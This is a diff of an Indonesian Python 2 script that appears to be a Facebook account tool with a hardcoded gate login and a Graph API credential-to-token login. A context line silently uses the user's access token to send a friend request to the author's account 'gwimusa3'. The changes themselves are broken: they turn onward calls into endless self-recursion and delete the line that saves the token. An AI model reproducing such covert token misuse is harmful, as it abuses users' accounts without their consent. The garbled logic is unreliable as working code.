@@ -84,7 +84,7 @@ def siapa():
 		os.system('clear')
 		jalan("\033[1;97mSelamat datang \033[1;92m" +nama+ "\n\033[1;97mJanggan lupa SUBSCRIBE YuoTube Admin terimakasih !!")
 		time.sleep(1)
-		loginSC()
+		siapa()
 		
 		
 def loginSC():
@@ -105,7 +105,7 @@ def loginSC():
 	if username =="SEMOGA" and password =="BERHASIL":
 		print"\033[1;96m[✓] \033[1;92mLogin success"
 		time.sleep(1)
-		login()
+		loginSC()
 	else:
 		print"\033[1;96m[!] \033[1;91mSalah!!"
 		os.system('xdg-open https://tatawirdat.blogspot.com')
@@ -150,7 +150,6 @@ def login():
 				r=requests.get(url,params=data)
 				z=json.loads(r.text)
 				unikers = open("login.txt", 'w')
-				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Berhasil'
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
@@ -394,4 +393,4 @@ def pilih_super():
        
 		
 if __name__ == '__main__':
-        siapa()
+        login()
